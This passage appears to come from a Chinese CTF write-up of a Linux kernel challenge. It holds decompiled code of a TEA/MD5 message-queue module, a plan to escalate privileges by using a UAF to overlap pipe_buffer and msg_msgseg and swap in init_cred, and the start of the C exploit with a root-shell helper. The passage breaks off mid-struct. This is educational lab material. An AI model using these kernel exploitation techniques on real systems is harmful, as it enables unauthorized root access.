+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">kkk_msg_handler_fn</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v0; <span class="hljs-comment">// r14</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// rdi</span><br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  __int64 v4; <span class="hljs-comment">// r15</span><br>  __int64 v5; <span class="hljs-comment">// rax</span><br>  __int64 v6; <span class="hljs-comment">// rax</span><br>  __int16 v7; <span class="hljs-comment">// cx</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// rdi</span><br>  __int64 v9; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">void</span> *v10; <span class="hljs-comment">// rdi</span><br>  __int64 v11[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  v11[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">while</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)kkk_read_u2k_queue(v11) )<br>        msleep(<span class="hljs-number">1000LL</span>);<br>      v0 = v11[<span class="hljs-number">0</span>];<br>      <span class="hljs-keyword">if</span> ( *(_WORD *)v11[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">break</span>;<br>      printk(&amp;unk_1743);<br>LABEL_24:<br>      msg_free(v11[<span class="hljs-number">0</span>]);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>接下来是一个巨大的 switch，根据从 <code>u2k</code> 队列中取出的 object 指定字段的值进行相应处理，主要实现了 <code>tea</code> 加密、<code>tea</code> 解密、<code>md5</code> 哈希算法三种功能</p>
+<p>在完成请求后会根据选项不同与执行结果不同选择是否将该 object 重用并写入 <code>k2u</code> 队列或是分配一个新的 <code>object</code> 写入 <code>k2u</code> 队列，对于 <code>md5</code> 哈希请求而言总会分配一个新的 object，而 <code>tea</code> 加解密请求则会，作为请求执行的结果返回给用户：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-keyword">switch</span> ( v1 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        v5 = msg_alloc(<span class="hljs-number">16LL</span>);<br>        <span class="hljs-keyword">if</span> ( v5 )<br>        &#123;<br>          v4 = v5;<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)kkk_crypto_hash_md5((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">24</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>)) )<br>          &#123;<br>            printk(&amp;unk_17E1);<br>            v7 = <span class="hljs-number">2</span>;<br>            v6 = <span class="hljs-number">0LL</span>;<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            v6 = <span class="hljs-number">16LL</span>;<br>            v7 = <span class="hljs-number">1</span>;<br>          &#125;<br>          *(_DWORD *)v4 = <span class="hljs-number">196610</span>;<br>          *(_WORD *)(v4 + <span class="hljs-number">4</span>) = v7;<br>          *(_QWORD *)(v4 + <span class="hljs-number">8</span>) = *(_QWORD *)(v0 + <span class="hljs-number">8</span>);<br>          <span class="hljs-keyword">goto</span> LABEL_23;<br>        &#125;<br>        <span class="hljs-keyword">goto</span> LABEL_32;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        v8 = *(_QWORD *)(v11[<span class="hljs-number">0</span>] + <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( v8 &lt; <span class="hljs-number">0x18</span> || (v8 &amp; <span class="hljs-number">7</span>) != <span class="hljs-number">0</span> )<br>        &#123;<br>          v10 = &amp;unk_17AD;<br>          <span class="hljs-keyword">goto</span> LABEL_31;<br>        &#125;<br>        v9 = msg_alloc(v8 - <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( !v9 )<br>        &#123;<br>LABEL_27:<br>          v10 = &amp;unk_1795;<br>LABEL_31:<br>          printk(v10);<br>          <span class="hljs-keyword">goto</span> LABEL_32;<br>        &#125;<br>        v4 = v9;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)kkk_crypto_tea_decrypt((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">40</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>) &gt;= <span class="hljs-number">0</span> )<br>        &#123;<br>          *(_DWORD *)v4 = <span class="hljs-number">131074</span>;<br>LABEL_22:<br>          *(_WORD *)(v4 + <span class="hljs-number">4</span>) = <span class="hljs-number">1</span>;<br>          *(_QWORD *)(v4 + <span class="hljs-number">8</span>) = *(_QWORD *)(v0 + <span class="hljs-number">8</span>);<br>          v6 = *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>;<br>LABEL_23:<br>          *(_QWORD *)(v4 + <span class="hljs-number">16</span>) = v6;<br>          kkk_write_k2u_queue(v4);<br>          <span class="hljs-keyword">goto</span> LABEL_24;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        v2 = *(_QWORD *)(v11[<span class="hljs-number">0</span>] + <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( v2 &lt; <span class="hljs-number">0x18</span> || (v2 &amp; <span class="hljs-number">7</span>) != <span class="hljs-number">0</span> )<br>        &#123;<br>          v10 = &amp;unk_1761;<br>          <span class="hljs-keyword">goto</span> LABEL_31;<br>        &#125;<br>        v3 = msg_alloc(v2 - <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( !v3 )<br>          <span class="hljs-keyword">goto</span> LABEL_27;<br>        v4 = v3;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)kkk_crypto_tea_encrypt((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">40</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>) &gt;= <span class="hljs-number">0</span> )<br>        &#123;<br>          *(_DWORD *)v4 = (_DWORD)&amp;unk_10002;<br>          <span class="hljs-keyword">goto</span> LABEL_22;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        *(_WORD *)v11[<span class="hljs-number">0</span>] = <span class="hljs-number">2</span>;<br>        *(_WORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-number">2</span>;<br>        printk(&amp;unk_1808);<br>        <span class="hljs-keyword">goto</span> LABEL_33;<br>    &#125;<br>    kfree(v4);<br>LABEL_32:<br>    *(_WORD *)v0 = <span class="hljs-number">2</span>;<br>    *(_WORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-number">2</span>;<br>LABEL_33:<br>    kkk_write_k2u_queue(v0);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>逆向分析我们不难获得 <code>u2k</code> 与 <code>k2u</code> 队列中的 object 的结构体定义：</p>
+<blockquote>
+<p><del>👴自己逆半天得的，没有偷偷看源码</del></p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REQUEST    1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REPLY      2</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_ENCRYPT_TEA     1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_DECRYPT_TEA     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_HASH_MD5        3</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SUCCESS      1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_FAIL         2</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> type;<br>    <span class="hljs-type">uint16_t</span> cmd;<br>    <span class="hljs-type">uint32_t</span> status;<br>    <span class="hljs-type">uint64_t</span> tag;<br>    <span class="hljs-type">uint64_t</span> data_len;<br>    <span class="hljs-type">uint8_t</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>那么这个内核模块的全貌便已经展现在我们面前了：用户通过 <code>ioctl()</code> 向请求队列 <code>u2k</code> 中放入请求消息（每条消息附带一个 header），内核线程异步地从 <code>u2k</code> 队列中读取消息，根据其类型进行处理，完成之后将结果放回 <code>k2u</code> 队列，由用户进行异步读取；对于请求与响应消息长度相同的，内核会复用相应的 object，否则会分配新的 object 作为返回结果并释放储存原有请求信息的 object</p>
+<p>严格意义上来说这道题其实没有完全完成，笔者原本想要写一个完整的用户与内核间的  <em>异步通信消息处理框架</em>  ，但是最后只完成了异步通信队列，没有完成基于内存共享的状态查询部分，不过我们仍能通过 <code>ioctl()</code> 直接读取的方式完成轮询，就是开销巨大：）</p>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用 UAF 将 <code>pipe_buffer</code> 和 <code>msg_msgseg</code> 分配到一起，读写 pipe 使得其使用 <code>pipe_buffer[1]</code> 以避免 <code>msg_msgseg</code> 开头的 NULL 干扰，之后不断重分配 <code>msg_msgseg</code> 进行内存搜索找到当前进程的 <code>task_struct</code> 并将 <code>task_struct-&gt;cred</code> 改为 <code>init_cred</code> 即可完成提权</p>
+<p>这里没有选择将两个 <code>pipe_buffer</code> 分配到同一个 object 的方式是因为<strong>题目开启了</strong> <code>CONFIG_INIT_ON_FREE_DEFAULT_ON</code> <strong>，所有的内核对象在释放后都会被清零</strong>，因此我们很难直接构造出 page-level UAF</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * I - fundamental functions</span><br><span class="hljs-comment"> * e.g. CPU-core binder, user-status saver, etc.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> page_offset_base = <span class="hljs-number">0xffff888000000000</span>, vmemmap_base = <span class="hljs-number">0xffffea0000000000</span>;<br><span class="hljs-type">size_t</span> init_task, init_nsproxy, init_cred;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">direct_map_addr_to_page_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> direct_map_addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> page_count;<br><br>    page_count = ((direct_map_addr &amp; (~<span class="hljs-number">0xfff</span>)) - page_offset_base) / <span class="hljs-number">0x1000</span>;<br>    <br>    <span class="hljs-keyword">return</span> vmemmap_base + page_count * <span class="hljs-number">0x40</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* root checker and shell poper */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-comment">/* userspace status saver */</span><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* bind the process to specific core */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span>;</span><br><br><span class="hljs-comment">/* read start from len to offset, write start from offset */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> 